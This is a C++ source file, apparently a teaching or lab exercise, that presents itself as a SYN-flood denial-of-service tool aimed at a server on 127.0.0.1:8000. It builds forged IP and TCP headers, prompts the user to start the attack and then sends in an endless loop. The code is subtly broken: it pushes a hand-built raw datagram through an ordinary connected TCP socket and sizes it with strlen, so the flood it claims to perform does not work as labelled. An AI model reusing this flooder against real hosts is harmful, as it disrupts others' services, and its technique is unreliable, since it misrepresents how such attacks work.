#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <pthread.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#include <atomic>
#include <iostream>
#include <memory>

#include "libs/utils.cpp"

void* receive(void* arg) {
    char msg[256];
    int ct = 0;

    while (true) {
        int err = recv(*(int*)arg, msg, 255, 0);

        if (err > 0) {
            msg[255] = '\0';
            std::cout << msg;
            ct++;

            if (ct > 2000)
                break;
        }

        if (err == 0) {
            break;
        }

        if (err == -1)
            handle_error_en(-1, "recv");
    }

    pthread_exit(0);
}

int main(int argc, char **argv) {
	char datagram[4096], source_ip[32];

	strcpy(source_ip, "127.0.0.1");
	memset(datagram, 0, 4096);

	struct sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(8000);
	sin.sin_addr.s_addr = inet_addr(source_ip);

	auto iph = fillIPHeader(datagram, source_ip, sin);
	auto tcph = fillTCPHeader(datagram);
	tcph->ack = 0;

	auto psh = fillFakeHeader(source_ip, sin);

	memcpy(&psh.tcp, tcph, sizeof(struct tcphdr));
	std::cout << psh.tcpLength << std::endl;

	tcph->check = checksum((unsigned short *)&psh, sizeof(struct FakeHeader));

	system("clear");
	pthread_attr_t attr;
	int err = pthread_attr_init(&attr);

	if (err != 0)
		handle_error_en(err, "pthread_attr_init");

	int socket_descr = socket(AF_INET, SOCK_STREAM, 0);

	if (socket_descr == -1)
		handle_error_en(-1, "socket");
	
	struct sockaddr_in server_sa;
	server_sa.sin_family = AF_INET;
	server_sa.sin_port = htons(8000);
	server_sa.sin_addr.s_addr = inet_addr(source_ip);

	std::cout << "Press Enter to start SYN-flood attack..." << std::endl;
    std::cin.ignore();

	if (connect(socket_descr, (struct sockaddr *)&server_sa, sizeof(server_sa)) == -1)
		handle_error_en(-1, "connect");

	pthread_t thread;
	err = pthread_create(&thread, &attr, receive, &socket_descr);

	if (err != 0)
		handle_error_en(err, "pthread_create");


	while (true) {
		send(socket_descr, datagram, strlen(datagram), 0);
	}

	close(socket_descr);
}
